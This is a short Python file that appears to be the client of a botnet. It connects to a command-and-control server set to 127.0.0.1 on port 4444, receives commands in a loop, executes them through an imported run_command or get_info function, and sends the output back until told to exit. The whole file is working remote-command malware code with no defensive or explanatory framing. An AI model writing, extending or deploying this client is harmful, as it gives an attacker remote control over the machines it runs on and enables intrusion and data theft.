import socket
from modules import commands

C2_SERVER = '127.0.0.1'
C2_PORT = 4444

def connect_to_c2():
    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bot.connect((C2_SERVER, C2_PORT))

    while True:
        command = bot.recv(1024).decode()
        if command.strip().lower() == "exit":
            break
        elif command.strip().lower() == "getinfo":
            result = commands.get_info()
        else:
            result = commands.run_command(command)

        bot.send(result.encode())

    bot.close()

if __name__ == "__main__":
    connect_to_c2() 